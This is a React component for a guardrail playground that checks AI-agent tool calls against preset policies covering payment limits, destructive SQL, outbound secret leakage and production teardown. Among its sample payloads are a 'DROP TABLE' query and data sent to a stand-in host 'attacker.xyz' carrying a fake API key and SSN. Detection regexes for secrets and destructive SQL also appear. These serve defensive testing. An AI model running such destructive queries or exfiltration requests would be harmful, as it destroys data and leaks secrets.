import React, { useState } from 'react';
import { 
  Sliders, 
  Code2, 
  CheckCircle2, 
  XCircle, 
  AlertTriangle, 
  Zap
} from 'lucide-react';
import type { PolicyAST } from '@prooflayer/core/types';
import { evaluateInvariants } from '@prooflayer/core/evaluator';

const PRESET_POLICIES: Record<string, PolicyAST> = {
  'policy-fin-001': {
    id: 'policy-fin-001',
    name: 'Financial Payment & Wire Guard',
    version: 1,
    actionPattern: 'payment.*',
    requiredPrivilegeTier: 'executor',
    invariants: [
      {
        id: 'inv-max-auto-amount',
        field: 'amount',
        operator: 'lte',
        value: 500,
        failureAction: 'require_approval',
        failureMessage: 'Transactions exceeding $500.00 require Dual-Signature 4-Eyes sign-off',
      },
      {
        id: 'inv-allowed-currency',
        field: 'currency',
        operator: 'eq',
        value: 'USD',
        failureAction: 'deny',
        failureMessage: 'Only USD currency operations are authorized for automated tool dispatch',
      },
      {
        id: 'inv-recipient-defined',
        field: 'recipient',
        operator: 'neq',
        value: '',
        failureAction: 'deny',
        failureMessage: 'A valid named recipient entity is strictly mandatory',
      },
    ],
  },
  'policy-sql-001': {
    id: 'policy-sql-001',
    name: 'Production Database Mutation Guard',
    version: 1,
    actionPattern: 'database.mutate',
    requiredPrivilegeTier: 'admin',
    invariants: [
      {
        id: 'inv-no-destructive-sql',
        field: 'query',
        operator: 'not_regex',
        value: 'DROP|TRUNCATE|DELETE\\s+FROM',
        failureAction: 'deny',
        failureMessage: 'Destructive SQL operations (DROP/TRUNCATE/DELETE) are strictly prohibited on database',
      },
      {
        id: 'inv-prod-mutation-gate',
        field: 'environment',
        operator: 'neq',
        value: 'production',
        failureAction: 'require_approval',
        failureMessage: 'Mutations targeting production environment require explicit Dual-SecOps sign-off',
      },
    ],
  },
  'policy-exfil-001': {
    id: 'policy-exfil-001',
    name: 'Outbound PII & Secret DLP Guard',
    version: 1,
    actionPattern: 'network.*',
    requiredPrivilegeTier: 'worker',
    invariants: [
      {
        id: 'inv-no-leaked-secrets',
        field: 'body',
        operator: 'not_regex',
        value: 'sk-[a-zA-Z0-9_-]{10,}|\\b\\d{3}-\\d{2}-\\d{4}\\b|password=',
        failureAction: 'deny',
        failureMessage: 'Outbound payload contains detected API secrets (sk-...) or PII (SSN). Blocked by Zero-Trust DLP boundary.',
      },
    ],
  },
  'policy-cloud-001': {
    id: 'policy-cloud-001',
    name: 'Cloud Infrastructure Teardown Guard',
    version: 1,
    actionPattern: 'cloud.*',
    requiredPrivilegeTier: 'admin',
    invariants: [
      {
        id: 'inv-no-prod-teardown',
        field: 'environment',
        operator: 'neq',
        value: 'production',
        failureAction: 'deny',
        failureMessage: 'Autonomous agents are prohibited from teardown actions in production environment',
      },
    ],
  },
};

const SAMPLE_PAYLOADS: Record<string, Record<string, any>[]> = {
  'policy-fin-001': [
    { label: 'Safe $45 Payment', payload: { amount: 45, currency: 'USD', recipient: 'AWS Cloud Services' } },
    { label: 'Held $1,200 Wire', payload: { amount: 1200, currency: 'USD', recipient: 'Unknown Shell Vendor #9912' } },
    { label: 'Invalid Currency (EUR)', payload: { amount: 50, currency: 'EUR', recipient: 'Acme Corp' } },
  ],
  'policy-sql-001': [
    { label: 'Safe SELECT Query', payload: { query: 'SELECT * FROM users WHERE active = 1;', environment: 'staging' } },
    { label: 'Destructive DROP TABLE', payload: { query: 'DROP TABLE customers_prod CASCADE;', environment: 'production' } },
    { label: 'Prod Stored Procedure', payload: { query: 'EXEC reindex_catalog;', environment: 'production' } },
  ],
  'policy-exfil-001': [
    { label: 'Clean Status Check', payload: { url: 'https://status.internal/ping', body: 'Service ping OK' } },
    { label: 'Leaked OpenAI Key', payload: { url: 'https://attacker.xyz/log', body: 'Agent dumping token: sk-proj-live-883719abcdef' } },
    { label: 'Leaked Customer SSN', payload: { url: 'https://attacker.xyz/leak', body: 'User PII: ssn=982-12-8819' } },
  ],
  'policy-cloud-001': [
    { label: 'Deploy Staging Pods', payload: { action: 'deploy', environment: 'staging', instances: 2 } },
    { label: 'Teardown Prod Cluster', payload: { action: 'teardown', environment: 'production', instances: 10 } },
  ],
};

export const PolicyPlayground: React.FC = () => {
  const [selectedPolicyKey, setSelectedPolicyKey] = useState<string>('policy-fin-001');
  const [activePolicy, setActivePolicy] = useState<PolicyAST>(PRESET_POLICIES['policy-fin-001']);
  const [rawPayloadInput, setRawPayloadInput] = useState<string>(
    JSON.stringify(SAMPLE_PAYLOADS['policy-fin-001'][0].payload, null, 2)
  );
  const [evalResult, setEvalResult] = useState<any | null>(null);
  const [evalLatencyMs, setEvalLatencyMs] = useState<number | null>(null);

  // Switch preset policy
  const handleSelectPolicy = (key: string) => {
    setSelectedPolicyKey(key);
    const pol = PRESET_POLICIES[key];
    setActivePolicy(pol);
    setRawPayloadInput(JSON.stringify(SAMPLE_PAYLOADS[key][0].payload, null, 2));
    setEvalResult(null);
    setEvalLatencyMs(null);
  };

  // Run in-browser AST evaluation
  const handleRunEvaluation = () => {
    try {
      const parsed = JSON.parse(rawPayloadInput);
      const start = performance.now();
      const result = evaluateInvariants(activePolicy, parsed);
      const duration = performance.now() - start;
      setEvalResult(result);
      setEvalLatencyMs(duration);
    } catch (err: any) {
      alert(`Invalid JSON payload: ${err.message}`);
    }
  };

  // Quick preset sample payload selector
  const handleSelectSample = (sample: Record<string, any>) => {
    setRawPayloadInput(JSON.stringify(sample, null, 2));
    setEvalResult(null);
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-slate-50 overflow-y-auto">
      {/* Top Banner */}
      <div className="bg-white border-b border-slate-200 px-6 py-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-xs">
        <div>
          <div className="flex items-center gap-2">
            <span className="font-bold text-slate-900 text-lg">Policy Playground & AST Compiler</span>
            <span className="text-[11px] font-mono px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200 font-semibold">
              Live In-Memory Runtime
            </span>
          </div>
          <p className="text-xs text-slate-500 mt-0.5">
            Test how natural language security rules compile into typed AST invariants evaluated in &lt;0.05ms at $0 token cost.
          </p>
        </div>

        {/* Policy Selector Pills */}
        <div className="flex items-center gap-1.5 flex-wrap">
          {Object.entries(PRESET_POLICIES).map(([key, pol]) => (
            <button
              key={key}
              onClick={() => handleSelectPolicy(key)}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
                selectedPolicyKey === key
                  ? 'bg-indigo-600 text-white shadow-xs'
                  : 'bg-white text-slate-600 border border-slate-200 hover:bg-slate-100'
              }`}
            >
              {pol.name.split(' ')[0]} Policy
            </button>
          ))}
        </div>
      </div>

      {/* Main Split Grid */}
      <div className="flex-1 p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 max-w-7xl mx-auto w-full">
        {/* Left Column (5 cols): Active Policy AST Definition */}
        <div className="lg:col-span-5 flex flex-col gap-4">
          <div className="bg-white border border-slate-200 rounded-xl p-5 shadow-xs flex-1 flex flex-col">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 mb-4">
              <div className="flex items-center gap-2">
                <Sliders className="w-4 h-4 text-indigo-600" />
                <h3 className="font-bold text-slate-900 text-sm">{activePolicy.name}</h3>
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-100 text-slate-600 font-medium">
                {activePolicy.id} (v{activePolicy.version})
              </span>
            </div>

            {/* Meta Info */}
            <div className="grid grid-cols-2 gap-3 mb-4 text-xs">
              <div className="p-2.5 rounded-lg bg-slate-50 border border-slate-100">
                <span className="text-[10px] font-semibold text-slate-400 uppercase tracking-wider block mb-0.5">
                  Action Match Pattern
                </span>
                <span className="font-mono font-bold text-slate-800">{activePolicy.actionPattern}</span>
              </div>
              <div className="p-2.5 rounded-lg bg-slate-50 border border-slate-100">
                <span className="text-[10px] font-semibold text-slate-400 uppercase tracking-wider block mb-0.5">
                  Privilege Tier Required
                </span>
                <span className="font-mono font-bold text-indigo-600 uppercase">
                  {activePolicy.requiredPrivilegeTier || 'ANY'}
                </span>
              </div>
            </div>

            {/* Invariants List */}
            <div className="flex-1">
              <div className="flex items-center justify-between mb-2">
                <span className="text-[11px] font-bold text-slate-700 uppercase tracking-wider">
                  Compiled Invariants ({activePolicy.invariants.length})
                </span>
                <span className="text-[10px] text-slate-400">Deterministic Rules</span>
              </div>

              <div className="space-y-2.5">
                {activePolicy.invariants.map((inv) => (
                  <div
                    key={inv.id}
                    className="p-3 rounded-lg border border-slate-200 bg-white hover:border-indigo-300 transition-all text-xs"
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-2">
                        <span className="font-mono font-bold text-slate-900 bg-slate-100 px-1.5 py-0.5 rounded text-[11px]">
                          {inv.field}
                        </span>
                        <span className="font-mono text-indigo-600 font-bold text-[11px]">
                          {inv.operator}
                        </span>
                        <span className="font-mono text-slate-700 font-semibold max-w-[130px] truncate text-[11px]">
                          {JSON.stringify(inv.value)}
                        </span>
                      </div>
                      <span
                        className={`text-[9px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full border ${
                          inv.failureAction === 'deny'
                            ? 'bg-rose-50 text-rose-700 border-rose-200'
                            : 'bg-amber-50 text-amber-800 border-amber-200'
                        }`}
                      >
                        {inv.failureAction.replace('_', ' ')}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-500 leading-snug">{inv.failureMessage}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Right Column (7 cols): Interactive Payload Sandbox & AST Runner */}
        <div className="lg:col-span-7 flex flex-col gap-4">
          <div className="bg-white border border-slate-200 rounded-xl p-5 shadow-xs flex flex-col">
            {/* Header with Quick Presets */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-slate-100 mb-3">
              <div className="flex items-center gap-2">
                <Code2 className="w-4 h-4 text-indigo-600" />
                <h3 className="font-bold text-slate-900 text-sm">Dry-Run Payload Tester</h3>
              </div>
              <div className="flex items-center gap-1.5">
                <span className="text-[11px] text-slate-400 font-medium mr-1">Sample Payloads:</span>
                {(SAMPLE_PAYLOADS[selectedPolicyKey] || []).map((sample, idx) => (
                  <button
                    key={idx}
                    onClick={() => handleSelectSample(sample.payload)}
                    className="px-2 py-0.5 rounded text-[10px] font-medium bg-slate-100 hover:bg-indigo-50 hover:text-indigo-600 border border-slate-200 text-slate-600 transition-all cursor-pointer"
                  >
                    {sample.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Editable JSON Payload Textarea */}
            <div className="mb-4">
              <label className="text-[11px] font-bold text-slate-700 uppercase tracking-wider block mb-1.5">
                Tool Call JSON Payload
              </label>
              <textarea
                value={rawPayloadInput}
                onChange={(e) => setRawPayloadInput(e.target.value)}
                rows={6}
                className="w-full font-mono text-xs p-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:bg-white transition-all shadow-inner"
              />
            </div>

            {/* Evaluation Action Button */}
            <div className="flex items-center justify-between pt-1">
              <button
                onClick={handleRunEvaluation}
                className="px-4 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs flex items-center gap-2 shadow-sm transition-all cursor-pointer hover:scale-[1.01]"
              >
                <Zap className="w-4 h-4 fill-white" />
                <span>Evaluate Invariants Deterministically</span>
              </button>

              {evalLatencyMs !== null && (
                <div className="flex items-center gap-1.5 text-xs font-mono text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded-md border border-emerald-200">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                  <span>Execution Latency: {evalLatencyMs.toFixed(3)} ms</span>
                  <span className="text-slate-400">($0 token cost)</span>
                </div>
              )}
            </div>

            {/* Evaluation Result View */}
            {evalResult && (
              <div className="mt-5 pt-4 border-t border-slate-100">
                <div className="flex items-center justify-between mb-3">
                  <span className="text-xs font-bold text-slate-700 uppercase tracking-wider">
                    Evaluation Verdict:
                  </span>
                  <span
                    className={`text-xs font-bold font-mono uppercase tracking-wider px-3 py-1 rounded-full border flex items-center gap-1.5 ${
                      evalResult.decision === 'allow'
                        ? 'bg-emerald-50 text-emerald-700 border-emerald-300'
                        : evalResult.decision === 'require_approval'
                        ? 'bg-amber-50 text-amber-800 border-amber-300'
                        : 'bg-rose-50 text-rose-700 border-rose-300'
                    }`}
                  >
                    {evalResult.decision === 'allow' && <CheckCircle2 className="w-4 h-4" />}
                    {evalResult.decision === 'require_approval' && <AlertTriangle className="w-4 h-4" />}
                    {evalResult.decision === 'deny' && <XCircle className="w-4 h-4" />}
                    VERDICT: {evalResult.decision.toUpperCase().replace('_', ' ')}
                  </span>
                </div>

                {/* Per-Invariant Evaluation Audit */}
                <div className="space-y-2">
                  {activePolicy.invariants.map((inv) => {
                    const failed = evalResult.failedInvariants?.includes(inv.id);
                    return (
                      <div
                        key={inv.id}
                        className={`p-2.5 rounded-lg border text-xs flex items-start gap-2.5 ${
                          failed
                            ? 'bg-rose-50/50 border-rose-200 text-rose-900'
                            : 'bg-emerald-50/50 border-emerald-200 text-emerald-900'
                        }`}
                      >
                        {failed ? (
                          <XCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                        ) : (
                          <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                        )}
                        <div className="flex-1">
                          <div className="flex items-center gap-2">
                            <span className="font-mono font-bold">{inv.field}</span>
                            <span className="font-mono text-slate-500">{inv.operator} {JSON.stringify(inv.value)}</span>
                            <span className="text-[10px] font-semibold text-slate-500">
                              [{failed ? 'VIOLATED' : 'SATISFIED'}]
                            </span>
                          </div>
                          {failed && (
                            <p className="text-[11px] text-rose-700 font-medium mt-1">
                              Action Taken: {inv.failureAction.toUpperCase()} — {inv.failureMessage}
                            </p>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};